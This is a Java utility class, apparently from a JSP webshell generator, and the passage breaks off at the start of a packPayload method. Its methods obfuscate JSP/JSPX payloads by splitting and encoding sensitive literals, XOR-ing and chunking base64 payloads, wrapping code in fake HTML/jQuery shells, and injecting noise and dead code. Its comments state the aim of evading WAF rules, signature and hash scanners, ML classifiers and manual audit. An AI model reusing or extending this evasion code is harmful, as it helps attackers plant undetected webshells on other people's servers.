package org.leo.jmg.mem.packer;

import org.leo.core.util.request.ClassNameGenerator;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.util.HashSet;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Util {

    public static String loadTemplateFromResource(String resourceName) {
        try (InputStream stream = Objects.requireNonNull(Util.class.getResourceAsStream(resourceName))) {
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            byte[] tmp = new byte[4096];
            int len;
            while ((len = stream.read(tmp)) != -1) {
                buf.write(tmp, 0, len);
            }
            return buf.toString(Charset.defaultCharset().name());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * 敏感字符串字面量静态列表（FQCN 类名为主），按长度降序排列避免子串干扰。
     * 反射调用的方法名/字段名参数由 {@link #collectLiterals(String)} 动态提取，无需手工维护。
     */
    private static final String[] SENSITIVE_LITERALS = {
        "javax.xml.bind.DatatypeConverter",
        "java.util.Base64",
        "sun.misc.Unsafe",
        "Base64"
    };

    /**
     * 匹配反射 API 调用的第一个字符串参数，捕获组 1 为参数值。
     * 覆盖：getMethod / getDeclaredMethod / getField / getDeclaredField /
     *        Class.forName / loadClass / getDeclaredConstructor
     */
    private static final Pattern REFLECTION_STRING_PATTERN = Pattern.compile(
        "(?:getMethod|getDeclaredMethod|getField|getDeclaredField|" +
        "getDeclaredConstructor|Class\\.forName|loadClass)\\s*\\(\\s*\"([^\"\\\\]+)\"",
        Pattern.DOTALL
    );

    /**
     * 收集需要编码的所有字符串字面量：静态列表 + 从代码中动态提取的反射参数。
     * 返回结果已按长度降序排列，避免短字符串是长字符串子串时的替换干扰。
     */
    private static java.util.List<String> collectLiterals(String code) {
        java.util.LinkedHashSet<String> set = new java.util.LinkedHashSet<String>();
        for (String s : SENSITIVE_LITERALS) {
            set.add(s);
        }
        Matcher m = REFLECTION_STRING_PATTERN.matcher(code);
        while (m.find()) {
            String arg = m.group(1);
            if (arg.length() > 1) {
                set.add(arg);
            }
        }
        java.util.List<String> list = new java.util.ArrayList<String>(set);
        list.sort(new java.util.Comparator<String>() {
            public int compare(String a, String b) { return b.length() - a.length(); }
        });
        return list;
    }

    /**
     * 将代码中出现的敏感字符串字面量随机拆分为 2–3 段拼接形式，
     * 例如 "defineClass" → "d"+"efin"+"eClass"，规避静态特征匹配。
     * <p>
     * 长度为 1 的字符串无法拆分，直接跳过；
     * 长度为 2 的字符串只能拆成 2 段；长度 ≥ 3 的随机选择 2 或 3 段。
     *
     * @param code JSP/JSPX 代码
     * @return 字面量已随机分割的代码
     */
    public static String splitStringLiterals(String code) {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        for (String literal : collectLiterals(code)) {
            String target = "\"" + literal + "\"";
            if (!code.contains(target) || literal.length() < 2) continue;

            // 决定分段数：长度 >= 3 时随机选 2 或 3，长度 == 2 只能选 2
            int segments = (literal.length() >= 3) ? (2 + random.nextInt(2)) : 2;

            // 随机选出 (segments-1) 个不重复的切割点，范围 [1, length-1]
            java.util.Set<Integer> pts = new java.util.LinkedHashSet<Integer>();
            while (pts.size() < segments - 1) {
                pts.add(1 + random.nextInt(literal.length() - 1));
            }
            int[] points = pts.stream().mapToInt(Integer::intValue).sorted().toArray();

            // 按切割点拼接各段
            StringBuilder sb = new StringBuilder();
            int prev = 0;
            for (int pt : points) {
                if (sb.length() > 0) sb.append("+");
                sb.append('"').append(literal, prev, pt).append('"');
                prev = pt;
            }
            sb.append("+\"").append(literal, prev, literal.length()).append('"');

            code = code.replace(target, sb.toString());
        }
        return code;
    }

    // -----------------------------------------------------------------------
    // 噪声标签生成（供 INSERT_SCRIPT_NOISE 步骤使用）
    // -----------------------------------------------------------------------

    /** 常见 CSS 属性片段，用于生成看起来真实的 style 内容 */
    private static final String[] CSS_PROPS = {
        "display:none", "visibility:hidden", "color:#fff",
        "margin:0", "padding:0 8px", "font-size:0",
        "opacity:0", "position:absolute", "z-index:-1"
    };

    /** 常见 HTML meta / link 属性，生成不依赖格式的自闭合噪声 */
    private static final String[][] META_ATTRS = {
        {"name", "viewport",   "content", "width=device-width"},
        {"name", "generator",  "content", "WordPress"},
        {"name", "robots",     "content", "noindex"},
        {"http-equiv", "X-UA-Compatible", "content", "IE=edge"},
        {"charset", "UTF-8"},
    };

    /** 简短 JS 片段，看起来像常规页面初始化代码 */
    private static final String[] JS_SNIPPETS = {
        "var _=window||{};",
        "if(document.readyState==='complete'){}",
        "window.__loaded=true;",
        "try{}catch(e){}",
        "(function(){})();",
        "/*@cc_on@*/",
        "var a=0,b=1;"
    };

    private static String randomNoiseTag() {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        int choice = random.nextInt(6);
        switch (choice) {
            case 0: {
                // <script>…合法 JS 片段…</script>
                String js = JS_SNIPPETS[random.nextInt(JS_SNIPPETS.length)];
                return "<script>" + js + "</script>";
            }
            case 1: {
                // HTML 注释，内容是随机单词
                int words = 2 + random.nextInt(4);
                StringBuilder sb = new StringBuilder("<!--");
                for (int i = 0; i < words; i++) {
                    sb.append(' ').append(randomWord(random, 3, 8));
                }
                sb.append(" -->");
                return sb.toString();
            }
            case 2: {
                // <style>.随机类名{属性}</style>
                String cls  = randomWord(random, 4, 10);
                String prop = CSS_PROPS[random.nextInt(CSS_PROPS.length)];
                return "<style>." + cls + "{" + prop + "}</style>";
            }
            case 3: {
                // <meta …> 自闭合
                String[] attrs = META_ATTRS[random.nextInt(META_ATTRS.length)];
                StringBuilder sb = new StringBuilder("<meta");
                for (int i = 0; i + 1 < attrs.length; i += 2) {
                    sb.append(' ').append(attrs[i]).append("=\"").append(attrs[i + 1]).append('"');
                }
                sb.append('>');
                return sb.toString();
            }
            case 4: {
                // <noscript><p>…</p></noscript>
                return "<noscript><p>" + randomWord(random, 4, 12) + "</p></noscript>";
            }
            default: {
                // <div id="…" style="display:none"></div>
                String id = randomWord(random, 4, 8);
                return "<div id=\"" + id + "\" style=\"display:none\"></div>";
            }
        }
    }

    /** 生成随机小写单词，长度在 [minLen, maxLen) */
    private static String randomWord(ThreadLocalRandom random, int minLen, int maxLen) {
        int len = minLen + random.nextInt(maxLen - minLen);
        char[] chars = new char[len];
        for (int i = 0; i < len; i++) {
            chars[i] = (char) ('a' + random.nextInt(26));
        }
        return new String(chars);
    }

    /**
     * 在 JSP 代码的 {@code %>} 与 {@code <%} 之间随机插入噪声标签，
     * 打断 WAF 对连续 scriptlet 边界的正则匹配。
     * <p>
     * 噪声内容为合法 HTML（script/style/meta/noscript/div/注释），
     * 不使用格式残缺的标签，避免残缺标签本身成为检测特征。
     *
     * @param code JSP 代码（不适用于 JSPX）
     * @return 插入噪声后的代码
     */
    public static String insertScriptNoiseTags(String code) {
        // 匹配 %> 之后紧跟（可选空白）任意 <% 变体（<%  <%!  <%@  <%=）
        Pattern p = Pattern.compile("%>([ \t\r\n]*)(<%[!@=]?)", Pattern.MULTILINE);
        Matcher m = p.matcher(code);
        StringBuffer sb = new StringBuffer();
        while (m.find()) {
            String ws = m.group(1);
            String nextOpen = m.group(2);
            String noise = randomNoiseTag();
            m.appendReplacement(sb, Matcher.quoteReplacement("%>" + ws + noise + "\n" + nextOpen));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    /**
     * Ghost Bits（Cast Attack）编码：
     * <ol>
     *   <li>将每个敏感字符串字面量替换为 {@code helperName("汉字...")} 调用；
     *       汉字的低 8 位 = 原始 ASCII 字节，高字节随机落在 CJK 块 U+4E00–U+9FFF。</li>
     *   <li>在模板的声明区块（{@code <%! %>} 或 {@code <jsp:declaration>}）注入一个随机命名的
     *       decode helper：
     *       {@code private static String rndName(String s){byte[] b=new byte[s.length()];
     *       for(int i=0;i<s.length();i++)b[i]=(byte)s.charAt(i);return new String(b);}}</li>
     * </ol>
     *
     * <p>读代码时看到的是一段汉字字符串传给一个短方法；运行时 {@code (byte)ch} 截断低 8 位还原原始字符串。
     * helper 方法名每次随机生成，消除固定 {@code _d} 特征。
     *
     * @param code JSP/JSPX 代码
     * @return Ghost Bits 编码后的代码
     */
    public static String ghostBitsEncode(String code) {
        ThreadLocalRandom random = ThreadLocalRandom.current();

        // 1. 生成本次 helper 方法名（随机，消除固定特征）
        String methodName = ClassNameGenerator.randomFieldName(new HashSet<String>());

        // 2. 收集本次代码中所有需要编码的字符串字面量（静态列表 + 动态提取反射参数）
        boolean changed = false;
        for (String literal : collectLiterals(code)) {
            String target = "\"" + literal + "\"";
            if (!code.contains(target)) continue;

            // 构造 methodName("汉字汉字...") 调用形式
            StringBuilder sb = new StringBuilder(methodName).append("(\"");
            for (int i = 0; i < literal.length(); i++) {
                int low  = literal.charAt(i) & 0xFF;          // 原始 ASCII 字节
                int high = random.nextInt(0x52) + 0x4E;       // CJK 高字节 0x4E–0x9F
                sb.append((char) ((high << 8) | low));         // 嵌入真实汉字字符
            }
            sb.append("\")");
            code = code.replace(target, sb.toString());
            changed = true;
        }
        if (!changed) return code;

        // 3. 构造 helper 方法体（decode：取每个 char 的低 8 位还原字节）
        String helperDecl = "private static String " + methodName
                + "(String s){"
                + "byte[] b=new byte[s.length()];"
                + "for(int i=0;i<s.length();i++)b[i]=(byte)s.charAt(i);"
                + "return new String(b);}";

        // 4. 将 helper 注入到声明区块（含非 ASCII CJK 字面量，需确保 UTF-8 pageEncoding）
        return injectHelperDecl(code, helperDecl, true);
    }

    /**
     * 将 helper 方法声明注入到代码的声明区块（JSP 的 {@code <%! %>} 或 JSPX 的 {@code <jsp:declaration>}）。
     * <p>
     * 注入策略：
     * <ul>
     *   <li>JSPX：在 {@code <jsp:declaration>} 的 CDATA 结束标记（{@code ]]>}）前插入</li>
     *   <li>JSP（已有 {@code <%! %>} 块）：在声明块的关闭 {@code %>} 前追加</li>
     *   <li>JSP（无 {@code <%! %>} 块）：在第一个 {@code <%} 前新建一个声明块</li>
     * </ul>
     * 若注入的 helper 含有非 ASCII 字符，同时确保文件头有 {@code pageEncoding="UTF-8"} 声明。
     *
     * @param code        JSP/JSPX 代码
     * @param helperDecl  要注入的 helper 方法体（单条 Java 声明语句，不含外层 {@code <%! %>}）
     * @param needUtf8    是否需要确保 pageEncoding=UTF-8（含有非 ASCII 字面量时传 true）
     * @return 注入 helper 后的代码
     */
    private static String injectHelperDecl(String code, String helperDecl, boolean needUtf8) {
        if (code.contains("<jsp:declaration>")) {
            int declStart = code.indexOf("<jsp:declaration>");
            int cdataEnd  = code.indexOf("]]>", declStart);
            if (cdataEnd >= 0) {
                code = code.substring(0, cdataEnd)
                        + "\n        " + helperDecl + "\n        "
                        + code.substring(cdataEnd);
            }
        } else {
            if (needUtf8 && !code.contains("pageEncoding")) {
                code = "<%@ page pageEncoding=\"UTF-8\" %>\n" + code;
            }
            int declIdx = code.indexOf("<%!");
            if (declIdx >= 0) {
                int closeIdx = code.indexOf("%>", declIdx + 3);
                if (closeIdx >= 0) {
                    code = code.substring(0, closeIdx)
                            + "\n    " + helperDecl + "\n"
                            + code.substring(closeIdx);
                }
            } else {
                int scriptletIdx = code.indexOf("<%");
                if (scriptletIdx >= 0) {
                    code = code.substring(0, scriptletIdx)
                            + "<%!\n    " + helperDecl + "\n%>\n"
                            + code.substring(scriptletIdx);
                }
            }
        }
        return code;
    }

    // -----------------------------------------------------------------------
    // 双字符打包编码（供 PACK_TWO_TO_ONE 步骤使用）
    // -----------------------------------------------------------------------

    /**
     * 将敏感字符串字面量中相邻两个 ASCII 字符打包进一个 {@code char} 的高低各 8 位，
     * 使编码后字符串长度减半，且每个编码字符的高低字节均来自真实源字符，无随机噪声。
     * <p>
     * 编码规则：{@code packed[i] = (literal[2i] << 8) | literal[2i+1]}。
     * 奇数长度末尾以 {@code '\0'} 补位，helper 方法通过原始长度参数截断还原。
     * <p>
     * 例：{@code "defineClass"} (11 字符) → 6 个打包字符，调用形式为
     * {@code helperName("攥攠攰攰摡", 11)}。
     * <p>
     * helper 方法注入到声明区块，签名为
     * {@code private static String name(String s, int n)}，
     * 运行时取每个 char 的高低字节依次还原字节数组，截到 n 个字节后构造字符串。
     * <p>
     * 与 {@link #ghostBitsEncode}、{@link #splitStringLiterals}、{@link #byteArrayEncode} 互斥：
     * 四者均作用于同一组敏感字面量。
     * <p>
     * 仅处理全 ASCII 字面量（所有字符 ≤ 0x7F）；含非 ASCII 字符时自动跳过，
     * 避免高低字节交叉污染。
     *
     * @param code JSP/JSPX 代码
     * @return 双字符打包编码后的代码
     */
    public static String packTwoToOne(String code) {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        String methodName = ClassNameGenerator.randomFieldName(new HashSet<String>());
        boolean changed = false;

        for (String literal : collectLiterals(code)) {
            String target = "\"" + literal + "\"";
            if (!code.contains(target)) continue;

            // 仅处理全 ASCII 字面量，含非 ASCII 字符时跳过
            boolean allAscii = true;
            for (int i = 0; i < literal.length(); i++) {
                if (literal.charAt(i) > 0x7F) { allAscii = false; break; }
            }
            if (!allAscii) continue;

            // 两两打包：(c[i] << 8) | c[i+1]，奇数长度末尾补 '\0'
            StringBuilder sb = new StringBuilder(methodName + "(\"");
            for (int i = 0; i < literal.length(); i += 2) {
                char hi = literal.charAt(i);
                char lo = (i + 1 < literal.length()) ? literal.charAt(i + 1) : '\0';
                sb.append((char) ((hi << 8) | (lo & 0xFF)));
            }
            // 传原始长度，helper 用来截掉奇数末尾的补位字节
            sb.append("\",").append(literal.length()).append(')');
            code = code.replace(target, sb.toString());
            changed = true;
        }
        if (!changed) return code;

        // helper：逐 char 取高低字节还原，截到 n 个字节
        String helperDecl =
            "private static String " + methodName + "(String s,int n){"
            + "byte[] b=new byte[n];"
            + "int k=0;"
            + "for(int i=0;i<s.length()&&k<n;i++){"
            +   "char c=s.charAt(i);"
            +   "b[k++]=(byte)(c>>8);"
            +   "if(k<n)b[k++]=(byte)(c&0xFF);"
            + "}"
            + "return new String(b);}";

        // 打包字符含非 ASCII，需确保容器以 UTF-8 读取
        return injectHelperDecl(code, helperDecl, true);
    }

    /** HTML 包裹用的伪装页面标题 */
    private static final String[] HTML_TITLES = {
        "index", "default", "login", "home", "view",
        "main", "portal", "dashboard", "welcome", "page"
    };

    /** 伪装用的随机 meta 标签片段 */
    private static final String[] META_SNIPPETS = {
        "<meta charset=\"UTF-8\">",
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">",
        "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">",
        "<meta name=\"robots\" content=\"noindex,nofollow\">",
        "<meta name=\"generator\" content=\"Apache Struts\">",
    };

    /**
     * JS 注释壳变体：每个元素为 [开头片段, 结尾片段]。
     * 开头以 {@code /*} 开启多行注释，结尾以 {@code *}{@code /} 关闭，
     * 将 JSP 代码藏在注释中（JSP 容器在输出前处理 scriptlet，注释对服务端无影响）。
     */
    private static final String[][] JS_WRAP_VARIANTS = {
        // jQuery $(document).ready 两种写法
        {"$(document).ready(function(){/*", "*/});"},
        {"jQuery(document).ready(function(){/*", "*/});"},
        // jQuery 简写
        {"$(function(){/*", "*/});"},
        // IIFE
        {"(function(w,d){/*", "*/})(window,document);"},
        // window.onload
        {"window.onload=function(){/*", "*/};"},
        // DOMContentLoaded
        {"document.addEventListener('DOMContentLoaded',function(){/*", "*/});"},
    };

    /**
     * 将 JSP 内容包裹在伪装 HTML 壳内，使文件头看起来像普通 HTML，
     * 规避基于文件内容扫描的检测。
     * <p>
     * 每次调用随机选取：标题、可选 meta 标签、JS 包裹变体，消除固定字符串特征。
     * 仅适用于 {@code .jsp}，不适用于 JSPX（会破坏 XML 结构）。
     *
     * @param jspCode JSP 代码
     * @return 包裹后的代码
     */
    public static String wrapWithHtmlJs(String jspCode) {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        String title = HTML_TITLES[random.nextInt(HTML_TITLES.length)];
        // 随机拼 1-2 个 meta 标签
        int metaCount = 1 + random.nextInt(2);
        StringBuilder head = new StringBuilder();
        java.util.Set<Integer> usedMeta = new java.util.HashSet<Integer>();
        for (int i = 0; i < metaCount; i++) {
            int idx;
            do { idx = random.nextInt(META_SNIPPETS.length); } while (!usedMeta.add(idx));
            head.append(META_SNIPPETS[idx]).append('\n');
        }
        String[] wrap = JS_WRAP_VARIANTS[random.nextInt(JS_WRAP_VARIANTS.length)];
        String header = "<!DOCTYPE html>\n<html>\n<head>\n<title>" + title + "</title>\n"
                + head
                + "</head>\n<body></body>\n</html>\n"
                + "<script>\n" + wrap[0] + "\n";
        String footer = "\n" + wrap[1] + "\n</script>";
        return header + jspCode + footer;
    }

    // -----------------------------------------------------------------------
    // XOR Payload 编码（供 XOR_PAYLOAD_ENCODE 步骤使用）
    // -----------------------------------------------------------------------

    /**
     * 对代码中的 base64 payload 字符串进行随机单字节 XOR 扰动：
     * <ol>
     *   <li>找到代码中所有长度 ≥ 100 的纯 base64 字符串字面量；</li>
     *   <li>base64 解码 → 逐字节 XOR 一个随机密钥（1–126）→ 重新 base64 编码，
     *       生成与原始 payload 完全不同的字符串（破坏 hash 指纹检测）；</li>
     *   <li>将原始字符串字面量替换为 {@code helperName("XOR编码后的base64", KEY)} 调用；</li>
     *   <li>在声明区块注入随机命名的 helper 方法：运行时对 XOR 后的 base64 再 XOR 还原，
     *       返回原始 base64 字符串供后续解码逻辑继续使用，对调用方完全透明。</li>
     * </ol>
     * <p>
     * helper 签名：{@code private static String helperName(String s, int k)}，
     * 方法名每次随机生成，消除固定特征。内部使用 {@code java.util.Base64}（Java 8+）。
     * <p>
     * 建议在 {@link #chunkPayload} 之前执行，使后续分块步骤能进一步拆散 XOR 后的字符串。
     *
     * @param code JSP/JSPX 代码（模板占位符已完成替换）
     * @return XOR 编码后的代码
     */
    public static String xorPayloadEncode(String code) {
        Pattern p = Pattern.compile("\"([A-Za-z0-9+/=]{100,})\"");
        Matcher m = p.matcher(code);
        // 先检查是否有可处理的 payload，没有则直接返回
        if (!m.find()) return code;

        ThreadLocalRandom random = ThreadLocalRandom.current();
        int key = 1 + random.nextInt(126); // XOR 密钥：1-126
        String methodName = ClassNameGenerator.randomFieldName(new HashSet<String>());

        // 替换所有符合条件的 base64 payload
        m.reset();
        StringBuffer sb = new StringBuffer();
        boolean changed = false;
        while (m.find()) {
            String b64 = m.group(1);
            String xorEncoded = xorBase64(b64, key);
            if (xorEncoded == null) {
                m.appendReplacement(sb, Matcher.quoteReplacement("\"" + b64 + "\""));
                continue;
            }
            m.appendReplacement(sb, Matcher.quoteReplacement(methodName + "(\"" + xorEncoded + "\"," + key + ")"));
            changed = true;
        }
        m.appendTail(sb);
        if (!changed) return code;
        code = sb.toString();

        // 构造 helper 方法：base64 解码 → XOR 还原 → 重新 base64 编码，返回原始 base64 字符串
        String helperDecl =
            "private static String " + methodName + "(String s,int k){"
            + "try{"
            + "byte[] b=java.util.Base64.getDecoder().decode(s);"
            + "for(int i=0;i<b.length;i++)b[i]=(byte)(b[i]^k);"
            + "return java.util.Base64.getEncoder().encodeToString(b);"
            + "}catch(Exception e){return s;}}";

        // 注入到声明区块（helper 仅含 ASCII，无需强制 UTF-8）
        return injectHelperDecl(code, helperDecl, false);
    }

    /**
     * 对 base64 字符串解码后逐字节 XOR，再重新编码返回。
     * 解码失败（非合法 base64）时返回 null，调用方保留原始字符串。
     */
    private static String xorBase64(String b64, int key) {
        try {
            byte[] bytes = java.util.Base64.getDecoder().decode(b64);
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key);
            }
            return java.util.Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 将代码中的长 base64 payload 字符串字面量随机切成 N 段 {@code "xxx"+"yyy"+...} 拼接形式，
     * 消除大段连续 base64 特征，规避基于长字符串的 WAF 检测。
     * <p>
     * 仅处理长度 ≥ 100 的纯 base64 字符串（字母、数字、{@code +/=}），短字符串不受影响。
     * 每段随机长度 16–40 字符，最终段保持原始末尾（base64 padding 不被切断）。
     * <p>
     * 对 JSP 和 JSPX 均适用。
     *
     * @param code JSP/JSPX 代码（{{base64Str}} 已完成模板替换）
     * @return payload 已切片的代码
     */
    public static String chunkPayload(String code) {
        Pattern p = Pattern.compile("\"([A-Za-z0-9+/=]{100,})\"");
        Matcher m = p.matcher(code);
        StringBuffer sb = new StringBuffer();
        ThreadLocalRandom random = ThreadLocalRandom.current();
        while (m.find()) {
            String payload = m.group(1);
            m.appendReplacement(sb, Matcher.quoteReplacement(chunkString(payload, random)));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    private static String chunkString(String s, ThreadLocalRandom random) {
        StringBuilder sb = new StringBuilder();
        int i = 0;
        while (i < s.length()) {
            int chunkLen = 16 + random.nextInt(25); // 16–40 chars per chunk
            int end = Math.min(i + chunkLen, s.length());
            if (sb.length() > 0) sb.append("+");
            sb.append('"').append(s, i, end).append('"');
            i = end;
        }
        return sb.toString();
    }

    /**
     * 在 JSP/JSPX 每个 scriptlet 块开头注入 1-2 条随机无副作用语句，
     * 使每次生成的 scriptlet 内容不同，打断基于 scriptlet 块内容哈希/签名的检测。
     * <p>
     * 注入内容为合法 Java 声明语句，变量名随机生成，不影响运行时行为：
     * {@code int v = Runtime.getRuntime().availableProcessors();}
     * {@code long v = System.currentTimeMillis();}
     * {@code boolean v = Thread.currentThread().isDaemon();}
     * {@code String v = System.getProperty("java.version", "");}
     * {@code Object v = Thread.currentThread().getContextClassLoader().getParent();}
     * <p>
     * JSP 模式：在 {@code <%}（非 {@code <%!}、{@code <%@}、{@code <%=}）后注入。
     * JSPX 模式：在 {@code <![CDATA[} 后注入。
     *
     * @param code JSP/JSPX 代码
     * @return 注入噪声后的代码
     */
    public static String injectScriptletNoise(String code) {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        Set<String> used = new HashSet<String>();

        if (code.contains("<jsp:scriptlet>")) {
            // JSPX 模式：仅在 <jsp:scriptlet> 标签内的 CDATA 块注入，跳过 <jsp:declaration> 的 CDATA
            Pattern p = Pattern.compile(
                "<jsp:scriptlet>(\\s*<!\\[CDATA\\[)",
                Pattern.DOTALL
            );
            Matcher m = p.matcher(code);
            StringBuffer sb = new StringBuffer();
            while (m.find()) {
                String prefix = m.group(1); // 保留 <jsp:scriptlet> 与 <![CDATA[ 之间的空白
                String noise = buildScriptletNoise(random, used);
                m.appendReplacement(sb, Matcher.quoteReplacement(
                    "<jsp:scriptlet>" + prefix + noise));
            }
            m.appendTail(sb);
            return sb.toString();
        } else {
            // JSP 模式：在 <% 块（排除 <%! <%@ <%=）开头注入
            Pattern p = Pattern.compile("<%(?![!@=])");
            Matcher m = p.matcher(code);
            StringBuffer sb = new StringBuffer();
            while (m.find()) {
                String noise = buildScriptletNoise(random, used);
                m.appendReplacement(sb, Matcher.quoteReplacement("<%" + noise));
            }
            m.appendTail(sb);
            return sb.toString();
        }
    }

    /** 生成 1-2 条随机无副作用 Java 声明语句（含换行缩进） */
    private static String buildScriptletNoise(ThreadLocalRandom random, Set<String> used) {
        int count = 1 + random.nextInt(2);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            String v = ClassNameGenerator.randomFieldName(used);
            switch (random.nextInt(5)) {
                case 0: sb.append("\n    int ").append(v)
                          .append(" = Runtime.getRuntime().availableProcessors();"); break;
                case 1: sb.append("\n    long ").append(v)
                          .append(" = System.currentTimeMillis();"); break;
                case 2: sb.append("\n    boolean ").append(v)
                          .append(" = Thread.currentThread().isDaemon();"); break;
                case 3: sb.append("\n    String ").append(v)
                          .append(" = System.getProperty(\"java.version\", \"\");"); break;
                default: sb.append("\n    Object ").append(v)
                           .append(" = Thread.currentThread().getContextClassLoader().getParent();"); break;
            }
        }
        sb.append('\n');
        return sb.toString();
    }

    // -----------------------------------------------------------------------
    // 死代码块注入（供 DEAD_BLOCK_INJECT 步骤使用）
    // -----------------------------------------------------------------------

    /**
     * 在每个 scriptlet 块开头注入 1 条随机死代码块，引用常见框架类（Spring、Servlet API、JNDI），
     * 使 ML 分类器产生误判（正常 Servlet 也会出现此类代码），同时增加人工 audit 追踪成本。
     * <p>
     * 死代码块均为合法 Java，不影响运行时行为：
     * <ul>
     *   <li>{@code try{Class.forName("org.springframework.*");}catch(ClassNotFoundException VAR){}} —
     *       框架探测，合法 Servlet 中极常见</li>
     *   <li>{@code try{new javax.naming.InitialContext().lookup("java:comp/env");}catch(Exception VAR){}} —
     *       JNDI 查找，EJB/Spring Boot 中大量出现</li>
     *   <li>{@code if(false){String VAR=System.getProperty("server.name","");}}} —
     *       if(false) 语义上永不执行，编译器不产生任何字节码</li>
     *   <li>{@code if(false){int VAR=request.getContentLength();if(VAR<0)return;}} —
     *       引用 Servlet request，让分类器特征提取到正常 Servlet 代码</li>
     *   <li>{@code try{Class.forName("org.apache.struts2.ServletActionContext");}catch(ClassNotFoundException VAR){}} —
     *       Struts2 探测</li>
     * </ul>
     * <p>
     * 每次注入的框架类名、变量名均随机，消除固定特征。
     * 与 {@link #injectScriptletNoise} 正交：后者注入单行语句，本方法注入完整的 try-catch/if 块。
     * <p>
     * 必须在 Unicode 编码之前执行，否则注入内容已被编码，可读性丧失且混淆效果下降。
     *
     * @param code JSP/JSPX 代码
     * @return 注入死代码块后的代码
     */
    public static String injectDeadBlocks(String code) {
        ThreadLocalRandom random = ThreadLocalRandom.current();
        Set<String> used = new HashSet<String>();

        if (code.contains("<jsp:scriptlet>")) {
            // JSPX 模式：仅在 <jsp:scriptlet> 内的 CDATA 块注入
            Pattern p = Pattern.compile(
                "<jsp:scriptlet>(\\s*<!\\[CDATA\\[)",
                Pattern.DOTALL
            );
            Matcher m = p.matcher(code);
            StringBuffer sb = new StringBuffer();
            while (m.find()) {
                String prefix = m.group(1);
                String block = buildDeadBlock(random, used);
                m.appendReplacement(sb, Matcher.quoteReplacement(
                    "<jsp:scriptlet>" + prefix + block));
            }
            m.appendTail(sb);
            return sb.toString();
        } else {
            // JSP 模式：在 <% 块（排除 <%! <%@ <%=）开头注入
            Pattern p = Pattern.compile("<%(?![!@=])");
            Matcher m = p.matcher(code);
            StringBuffer sb = new StringBuffer();
            while (m.find()) {
                String block = buildDeadBlock(random, used);
                m.appendReplacement(sb, Matcher.quoteReplacement("<%" + block));
            }
            m.appendTail(sb);
            return sb.toString();
        }
    }

    /** 常见框架类名，注入到 try-catch 中，让分类器看到正常框架调用 */
    private static final String[] DEAD_CLASS_NAMES = {
        "org.springframework.context.ApplicationContext",
        "org.springframework.web.context.WebApplicationContext",
        "org.springframework.beans.factory.BeanFactory",
        "org.apache.struts2.ServletActionContext",
        "com.opensymphony.xwork2.ActionContext",
        "org.apache.catalina.core.ApplicationContext",
        "org.hibernate.SessionFactory",
        "org.apache.log4j.Logger",
        "ch.qos.logback.classic.Logger",
    };

    /** 生成 1 条随机死代码块（含换行缩进） */
    private static String buildDeadBlock(ThreadLocalRandom random, Set<String> used) {
        String v = ClassNameGenerator.randomFieldName(used);
        switch (random.nextInt(5)) {
            case 0: {
                // try { Class.forName("框架类"); } catch (ClassNotFoundException v) {}
                String cls = DEAD_CLASS_NAMES[random.nextInt(DEAD_CLASS_NAMES.length)];
                return "\n    try{Class.forName(\"" + cls + "\");}catch(ClassNotFoundException " + v + "){}";
            }
            case 1: {
                // try { new InitialContext().lookup("java:comp/env"); } catch (Exception v) {}
                return "\n    try{new javax.naming.InitialContext().lookup(\"java:comp/env\");}catch(Exception " + v + "){}";
            }
            case 2: {
                // if (false) { String v = System.getProperty("server.name", ""); }
                String prop = DEAD_PROPERTIES[random.nextInt(DEAD_PROPERTIES.length)];
                return "\n    if(false){String " + v + "=System.getProperty(\"" + prop + "\",\"\");}";
            }
            case 3: {
                // if (false) { int v = request.getContentLength(); if (v < 0) return; }
                return "\n    if(false){int " + v + "=request.getContentLength();if(" + v + "<0)return;}";
            }
            default: {
                // if (false) { String v = request.getHeader("Accept-Language"); }
                String hdr = DEAD_HEADERS[random.nextInt(DEAD_HEADERS.length)];
                return "\n    if(false){String " + v + "=request.getHeader(\"" + hdr + "\");}";
            }
        }
    }

    private static final String[] DEAD_PROPERTIES = {
        "server.name", "java.vendor", "os.arch", "user.timezone",
        "java.class.version", "file.encoding", "sun.jnu.encoding"
    };

    private static final String[] DEAD_HEADERS = {
        "Accept-Language", "Accept-Encoding", "Cache-Control",
        "X-Forwarded-For", "X-Real-IP", "Referer", "DNT"
    };

    // -----------------------------------------------------------------------
    // Payload 双字符打包（供 PACK_PAYLOAD 步骤使用）
    // -----------------------------------------------------------------------

    /**
     * 将代码中的 base64 payload 字符串字面量进行双字符打包编码：
     * 相邻两个字符合并为一个 {@code char}（高字节 = 第一个字符，低字节 = 第二个字符），
     * 字符串长度减半，base64 字符集特征完全消失。
     * <p>
     * 处理目标：长度 ≥ 100 的纯 base64 字符串字面量（{@code [A-Za-z0-9+/=]{100,}}）。
     * base64 字符集全为 ASCII（≤ 0x7F），打包安全无损。
     * <p>
     * 例：{@code "AABCDE..."} → {@code helperName("䂂䃄...", 原始长度)}，
     * 调用方（如 {@code Base64.getDecoder().decode(...)}）完全透明。
     * <p>
     * 与 {@link #xorPayloadEncode} 互斥：两者均对 payload 字面量进行转换，先执行者有效，
     * 后执行者因已找不到合法的 base64 字面量而空操作。建议选其一，或先 XOR 再打包
     * （通过设置顺序实现双重保护，但需将 XOR 后的 base64 重新匹配，需求较少见）。
     * <p>
     * 建议在 {@link #chunkPayload} 之前执行：打包后字符串虽已无 base64 特征，
     * 但 helper 调用的参数仍可分块，两者叠加效果更强。
     *
     * @param code JSP/JSPX 代码（模板占位符已完成替换）
     * @return payload 已双字符打包的代码
     */
    public static String packPayload(String code) {
